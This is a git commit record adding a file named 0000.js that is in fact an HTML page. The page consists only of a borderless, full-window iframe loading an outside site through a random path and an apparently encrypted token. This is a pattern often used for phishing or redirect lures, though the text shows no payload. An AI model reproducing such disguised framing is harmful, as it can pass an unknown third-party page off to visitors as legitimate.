103edd48ec4766113e82af18e62bc4f8d601d9ca
abdo0154 <57696090+abdo0154@users.noreply.github.com>
2021-08-13 23:02:37 +0200

    My first commit

---
+++ 0000.js
@@ -0,0 +1,11 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Title Page</title>
+</head>
+<body><iframe allowfullscreen='' frameborder='0' height='100%' src='https://edu.volatilewriter.com/#/hosijiwusovozehicafunusinibimuv/U2FsdGVkX1PwLeSfEbesRxU5hCEBtncKzu0osZ34v8kKcc0VhloEEdQqLt' style='border:0px #ffffff none;' width='100%'/></body>
+</html>
